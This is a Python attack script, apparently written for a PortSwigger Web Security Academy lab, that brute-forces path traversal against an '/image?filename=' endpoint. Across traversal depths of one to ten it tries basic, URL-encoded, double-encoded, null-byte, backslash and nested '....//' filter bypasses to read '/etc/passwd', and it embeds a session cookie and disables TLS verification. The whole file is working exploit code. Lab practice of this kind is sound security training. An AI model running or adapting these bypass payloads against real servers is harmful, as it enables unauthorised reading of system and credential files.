#!/usr/bin/env python3
import requests
import urllib.parse
import sys

# Target URL and session
HOST = "0a4e001c03ab516b81460c3700ab00c2.web-security-academy.net"
SESSION = "a7asMKcp28qs8wJ6emFKWiYp9WMeajMk"

# Headers from the original request
headers = {
    "Host": HOST,
    "Cookie": f"session={SESSION}",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Sec-Ch-Ua-Mobile": "?0",
    "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Dest": "image",
    "Referer": f"https://{HOST}/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "i"
}

def test_payload(payload, description=""):
    """Test a specific payload and return the response"""
    url = f"https://{HOST}/image"
    params = {"filename": payload}
    
    try:
        response = requests.get(url, params=params, headers=headers, verify=False)
        print(f"\n[{description}] Testing: {payload}")
        print(f"URL: {response.url}")
        print(f"Status: {response.status_code}")
        print(f"Length: {len(response.content)}")
        
        # Check if we found /etc/passwd content
        if b"root:" in response.content or b"/bin/bash" in response.content:
            print(f"✓ SUCCESS! Found /etc/passwd content")
            print(f"Response preview: {response.content[:200]}")
            return True
        else:
            print(f"✗ Not found (got {len(response.content)} bytes)")
            if len(response.content) < 100:
                print(f"Response: {response.content}")
        
    except Exception as e:
        print(f"Error: {e}")
    
    return False

def main():
    print("Path Traversal Bypass Testing Script")
    print("====================================")
    
    # Test different depths (1 to 10 levels up)
    for depth in range(1, 11):
        traversal = "../" * depth
        
        # Basic traversal
        if test_payload(f"{traversal}etc/passwd", f"Basic traversal depth {depth}"):
            sys.exit(0)
        
        # Absolute path after traversal
        if test_payload(f"{traversal}/etc/passwd", f"Absolute path depth {depth}"):
            sys.exit(0)
        
        # Double slashes
        if test_payload(f"{traversal}//etc/passwd", f"Double slash depth {depth}"):
            sys.exit(0)
        
        # URL encoding
        encoded_traversal = urllib.parse.quote(traversal)
        if test_payload(f"{encoded_traversal}etc/passwd", f"URL encoded depth {depth}"):
            sys.exit(0)
        
        # Double URL encoding
        double_encoded = urllib.parse.quote(encoded_traversal)
        if test_payload(f"{double_encoded}etc/passwd", f"Double URL encoded depth {depth}"):
            sys.exit(0)
        
        # Mixed encoding
        mixed = traversal.replace("../", "%2e%2e/")
        if test_payload(f"{mixed}etc/passwd", f"Mixed encoding depth {depth}"):
            sys.exit(0)
        
        # Unicode encoding
        unicode_traversal = traversal.replace(".", "\u002e")
        if test_payload(f"{unicode_traversal}etc/passwd", f"Unicode depth {depth}"):
            sys.exit(0)
        
        # Null byte injection
        if test_payload(f"{traversal}etc/passwd%00", f"Null byte depth {depth}"):
            sys.exit(0)
        
        # With current directory
        if test_payload(f"{traversal}./etc/passwd", f"Current dir depth {depth}"):
            sys.exit(0)
        
        # Backslash variation
        backslash = traversal.replace("/", "\\")
        if test_payload(f"{backslash}etc\\passwd", f"Backslash depth {depth}"):
            sys.exit(0)
        
        # Extra dots
        extra_dots = traversal.replace("../", "..../")
        if test_payload(f"{extra_dots}etc/passwd", f"Extra dots depth {depth}"):
            sys.exit(0)
        
        # Stripped traversal sequences (in case of naive filtering)
        doubled = traversal.replace("../", "....//")
        if test_payload(f"{doubled}etc/passwd", f"Doubled dots depth {depth}"):
            sys.exit(0)
        
        # Nested traversal
        nested = traversal.replace("../", "..././")
        if test_payload(f"{nested}etc/passwd", f"Nested traversal depth {depth}"):
            sys.exit(0)

if __name__ == "__main__":
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()